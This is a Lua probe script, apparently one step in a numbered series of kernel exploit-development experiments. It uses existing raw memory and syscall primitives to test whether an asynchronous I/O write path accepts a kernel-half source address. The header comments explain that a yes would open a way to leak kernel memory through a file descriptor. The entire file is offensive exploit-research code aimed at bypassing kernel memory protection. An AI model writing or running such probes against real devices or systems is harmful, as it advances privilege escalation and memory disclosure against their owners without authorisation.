-- CRASH_CLASS: HIGH
-- PROBE 352l: whether the write path checks the source the way the read path
--             checks the destination
--
-- 352j showed the read destination is a user-range test: an unmapped page and a
-- kernel-half address both answer 0x8002000E. The write operation (cmd=2) walks
-- the other direction - the kernel copies *from* the pointer we name - so if
-- that side is not checked, the kernel would read its own memory and hand the
-- bytes to the file descriptor.
--
-- The cheap question first: does a kernel-half source answer EFAULT like the
-- destination does, or does it succeed? A success here is not yet a leak, but
-- it would mean the copy happened and the only thing missing is a file we can
-- read back.

print("=== PROBE 352l: AIO WRITE SOURCE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function hi_lo(v)
    local h, l = get_hi_lo(v)
    return to_num(h), to_num(l)
end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wq(addr, value)
    pcall(function() memory.write_qword(addr, value) end)
end
local function wd(addr, value)
    pcall(function() memory.write_dword(addr, value) end)
end
local function rd(addr)
    local ok, v = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(v) end
    return -999
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function open_path(path, flags)
    local ok, rv = pcall(function() return sc(5)(put_str(path), uint64(flags), Z) end)
    if not ok then return -1 end
    return sgn(rv)
end

local reqs = memory.alloc(0x200)
local data = memory.alloc(0x1000)
local result = memory.alloc(0x200)
local ids = memory.alloc(0x200)
local states = memory.alloc(0x100)
for i = 0, 0x3F do
    wq(reqs + i * 8, 0)
    wd(result + i * 4, 0)
    wd(ids + i * 4, 0)
    wd(states + i * 4, 0)
end
for i = 0, 0x3FF do wd(data + i * 4, 0xCCCCCCCC) end

local fd = open_path("/dev/null", 2)
print(string.format("fd(/dev/null) = %d", fd))
if fd < 0 then
    print("=== 352l DONE ===")
    return
end

local function once(cmd, len, buf, res)
    wq(reqs + 0x00, 0)
    wq(reqs + 0x08, len)
    local bh, bl = hi_lo(buf)
    wd(reqs + 0x10, bl) wd(reqs + 0x14, bh)
    local rh, rl = hi_lo(res)
    wd(reqs + 0x18, rl) wd(reqs + 0x1C, rh)
    wd(reqs + 0x20, fd)
    wd(reqs + 0x24, 0)
    wd(ids, 0)
    wd(result, 0)
    wd(result + 4, 0)
    local ok1, r1 = pcall(function()
        return sc(669)(uint64(cmd), uint64(reqs), uint64(1), uint64(1), uint64(ids))
    end)
    local sub = ok1 and sgn(r1) or nil
    local id = rd(ids)
    if id and id ~= 0 then
        wd(states, 0)
        pcall(function() return sc(664)(uint64(ids), uint64(1), uint64(states)) end)
        wd(ids, id)
        pcall(function() return sc(662)(uint64(ids), uint64(1), uint64(states)) end)
    end
    return sub, id, rd(result)
end

local K = uint64(string.format("0x%X%08X", 0xFFFF8000, 0x00000000))

print("[A] a control write of our own bytes")
local s, i, r = once(2, 16, uint64(data), uint64(result))
print(string.format("  cmd=2 data=ours      submit=%s id=0x%X result=0x%08X", tostring(s), i, r))

print("[B] the same again, to prove the queue is healthy")
s, i, r = once(2, 16, uint64(data), uint64(result))
print(string.format("  cmd=2 data=ours      submit=%s id=0x%X result=0x%08X", tostring(s), i, r))

print("[C] a source that is not mapped")
s, i, r = once(2, 16, uint64(0x1000), uint64(result))
print(string.format("  cmd=2 data=0x1000    submit=%s id=0x%X result=0x%08X", tostring(s), i, r))

print("[D] a source in the kernel half")
s, i, r = once(2, 16, K, uint64(result))
print(string.format("  cmd=2 data=kernel    submit=%s id=0x%X result=0x%08X", tostring(s), i, r))

print("[E] the control again")
s, i, r = once(2, 16, uint64(data), uint64(result))
print(string.format("  cmd=2 data=ours      submit=%s id=0x%X result=0x%08X", tostring(s), i, r))

print("")
print("=== 352l DONE ===")
